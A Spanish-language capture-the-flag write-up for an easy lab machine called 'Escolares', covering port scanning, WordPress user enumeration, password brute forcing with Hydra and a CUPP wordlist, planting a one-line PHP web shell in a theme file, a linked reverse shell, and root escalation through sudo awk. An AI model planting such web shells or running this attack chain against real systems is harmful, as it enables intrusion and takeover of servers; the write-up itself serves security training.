---
description: '✍️ Autor: Luisillo_o🔍 Dificultad: Fácil  📅 Fecha de creación: 09/06/2024'
---

# Escolares

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo, el puerto **22** perteneciente al servicio **SSH** y el puerto **80** perteneciente al servicio **HTTP** están abiertos, por lo que se procederá a indagar más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora exploramos el servicio **HTTP**. Se ingresó la dirección IP en el navegador, lo que llevó a que la página web sobre una universidad de ciberseguridad.

<figure><img src="../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

De primeras, no se nos muestra nada, por lo que revisamos el código fuente por si hay alguna información oculta relevante.

<figure><img src="../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

Se nos muestra un comentario que parece ser relevante ya que la información del personal académico está en el directorio `/profesores.html` por lo que accedemos a él.

<figure><img src="../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>

Nos llama la atención de **Luis** ya que pone que es el **admin** de Wordpress.

Ahora, buscamos directorios con la herramienta **Gobuster** a través del comando:

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml -u http://172.17.0.2
```

<figure><img src="../../.gitbook/assets/image (151).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (152).png" alt=""><figcaption></figcaption></figure>

Hemos localizado la ruta que necesitábamos, ahora utilizaremos **WPscan** para identificar la versión específica de WordPress y enumerar los usuarios, con el fin de confirmar los hallazgos anteriores.

```bash
wpscan --url http://172.17.0.2/wordpress/ -e u
```

<figure><img src="../../.gitbook/assets/image (153).png" alt=""><figcaption></figcaption></figure>

Hemos confirmado la existencia del usuario **luisillo** en el WordPress. Ahora, procederemos a utilizar Hydra para realizar un ataque de fuerza bruta contra este usuario

### 🚀 **EXPLOTACIÓN**

Con la información obtenida anteriormente, realizamos el comando:

```bash
hydra -l luisillo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 5
```

que utiliza la herramienta **Hydra** para realizar un ataque de fuerza bruta contra el servicio **SSH** de una máquina con la IP **172.17.0.2**. No tenemos suerte por lo que probaremos otra cosa.

Para obtener la contraseña del usuario, utilizaremos la herramienta **CUPP** (Common User Passwords Profiler), que no viene preinstalada en Kali Linux. CUPP está diseñada para generar listas de contraseñas personalizadas basadas en la información específica del usuario objetivo. Esto es útil porque muchos usuarios suelen crear contraseñas utilizando datos personales, como su nombre, fecha de nacimiento o el nombre de su mascota, en lugar de contraseñas genéricas.

Una vez que hemos instalado CUPP, ejecutamos el siguiente comando en la terminal para iniciarlo en modo interactivo:

```bash
cupp -i
```

<figure><img src="../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

Con la lista de contraseñas generada, estamos preparados para llevar a cabo el ataque de fuerza bruta y tratar de obtener credenciales válidas.

<figure><img src="../../.gitbook/assets/image (155).png" alt=""><figcaption></figcaption></figure>

La contraseña del usuario **luisillo** es **Luis1981**. Probamos las credenciales en el formulario del Wordpress.

> Nota: si nos da error [http://172.17.0.2/wordpress/wp-login.php](http://172.17.0.2/wordpress/wp-login.php) se debe añadir el dominio a /etc/hosts es decir, añadir 172.17.0.2 escolares.dl y reiniciar la página.

<figure><img src="../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

Nos deja entrar cuando quitamos el bloqueo de las cookies.

<figure><img src="../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

Accede al archivo `index.php` en la ruta `wp-content/themes/twentytwentytwo/` de tu instalación de WordPress y modifica el archivo con el siguiente código PHP:

```markdown
<?php echo "<pre>". shell_exec($_REQUEST['cmd']). "</pre>" ?>
```

Luego, abre tu navegador y accede a la siguiente URL para ejecutar comandos:

```ruby
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=whoami
```

Al ejecutar el comando `whoami`, deberías ver el resultado en la página, que indicará el usuario bajo el cual se está ejecutando el servidor web que es `www-data`. Sabiendo que podemos ejecutar cualquier comando, vamos a realizar una reverse **shell** utilizando la página web por lo que subimos este archivo PHP [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

<figure><img src="../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

```
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/reverse.php
```

Después de ejecutar el comando codificado en la URL, la página puede quedarse cargando indefinidamente. Esto indica que la solicitud está en proceso, pero no necesariamente significa que ha fallado.

Nos ponemos en escucha por el puerto 443:

<figure><img src="../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root** ya que somos www-data como se mostraba anteriormente.

Para facilitar la interacción con la **shell**, migraremos a una sesión de **bash** más funcional. Esto es necesario porque en la **shell** actual no podemos utilizar las teclas de flecha ni acceder al historial de comandos. Ejecutando el siguiente comando, iniciamos una nueva sesión de bash sin registrar la actividad en ningún archivo:

```bash
script /dev/null -c bash
```

Estamos ejecutando comandos como el usuario `www-data`, lo que significa que nuestros permisos son limitados. Sin embargo, podemos intentar explorar el directorio `/home` para ver si encontramos algo interesante. Al revisar el contenido de `/home`, además de los directorios de usuarios, encontramos un archivo llamado `secret.txt`. Este archivo contiene la contraseña de un usuario llamado **Luisillo**, lo que podría ser útil para obtener acceso adicional.&#x20;

<figure><img src="../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

Nos conectamos al sistema como el usuario **Luisillo**. Ahora que tenemos acceso como un usuario normal, navegamos a su carpeta personal y listamos el contenido, pero no encontramos nada relevante. Sin embargo, al ejecutar `sudo -l`, descubrimos que podemos elevar privilegios utilizando el binario `awk`.

<figure><img src="../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

Visitamos la página de **GFTOBins** para buscar una forma de escalar privilegios usando el binario `awk`. En la sección correspondiente a `awk` bajo el contexto de `sudo`, encontramos el comando que nos permitirá abusar de este binario para obtener privilegios de **root**. Puedes revisar los detalles en el siguiente enlace:

[GFTOBins - awk (sudo)](https://gtfobins.github.io/gtfobins/awk/#sudo)

Tras eso, ponemos:

```bash
whoami
```

y ya somos **root**.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
